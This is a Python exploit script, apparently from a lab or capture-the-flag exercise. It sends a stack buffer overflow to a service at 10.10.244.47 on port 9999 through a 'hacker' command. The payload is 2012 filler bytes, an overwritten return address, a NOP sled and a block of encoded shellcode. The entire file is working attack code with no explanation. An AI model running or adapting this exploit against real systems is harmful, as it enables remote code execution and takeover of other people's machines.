import socket
import time

ip = "10.10.244.47"
port = 9999
prefix = "hacker "
offset = 2012
overflow = "A" * offset
retn = "\xDF\x14\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\xd1\xb0\xaa\xea\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2d\x58\x28\xea\xcd"
"\x99\x4d\x62\x28\xa8\x4d\x10\x39\x9b\x7d\x52\x6f\x10\xf5\x36"
"\x9b\xa3\x7b\x9f\xac\x04\x31\xf9\x83\x95\x6a\x39\x82\x15\x71"
"\x6e\x64\x27\xba\x63\x65\x60\xa7\x8e\x37\x39\xa3\x3d\xa7\x4e"
"\xf9\xfd\x4c\x1c\xef\x85\xb1\xd5\x0e\xa7\x64\x6d\x49\x67\x87"
"\xa2\xe1\x2e\x9f\xa7\xcc\xf9\x14\x13\xba\xfb\xfc\x6d\x43\x57"
"\xc1\x41\xb6\xa9\x06\x65\x29\xdc\x7e\x95\xd4\xe7\x45\xe7\x02"
"\x6d\x5d\x4f\xc0\xd5\xb9\x71\x05\x83\x4a\x7d\xe2\xc7\x14\x62"
"\xf5\x04\x2f\x9e\x7e\xab\xff\x16\xc4\x88\xdb\x73\x9e\xb1\x7a"
"\xde\x71\xcd\x9c\x81\x2e\x6b\xd7\x2c\x3a\x06\xba\x38\x8f\x2b"
"\x44\xb9\x87\x3c\x37\x8b\x08\x97\xdf\xa7\xc1\x31\x18\xc7\xfb"
"\x86\xb6\x36\x04\xf7\x9f\xfc\x50\xa7\xb7\xd5\xd8\x2c\x47\xd9"
"\x0c\xe2\x17\x75\xff\x43\xc7\x35\xaf\x2b\x0d\xba\x90\x4c\x2e"
"\x10\xb9\xe7\xd5\xf3\xcc\xe6\xd4\xce\xb9\x0a\xd6\xd0\x2c\x82"
"\x30\xba\x5e\xc2\xeb\x53\xc6\x4f\x67\xc5\x07\x5a\x02\xc5\x8c"
"\x69\xf3\x88\x64\x07\xe7\x7d\x85\x52\x55\x2b\x9a\x48\xf1\xb7"
"\x09\x17\x01\xb1\x31\x80\x56\x96\x84\xd9\x32\x0a\xbe\x73\x20"
"\xd7\x26\xbb\xe0\x0c\x9b\x42\xe9\xc1\xa7\x60\xf9\x1f\x27\x2d"
"\xad\xcf\x7e\xfb\x1b\xb6\x28\x4d\xf5\x60\x86\x07\x91\xf5\xe4"
"\x97\xe7\xf9\x20\x6e\x07\x4b\x9d\x37\x38\x64\x49\xb0\x41\x98"
"\xe9\x3f\x98\x18\x09\xa2\x08\x55\xa2\x7b\xd9\xd4\xaf\x7b\x34"
"\x1a\xd6\xff\xbc\xe3\x2d\x1f\xb5\xe6\x6a\xa7\x26\x9b\xe3\x42"
"\x48\x08\x03\x47\x48\xae\xfb\x68")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(prefix + "\r\n", "latin-1"))
  time.sleep(1)
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
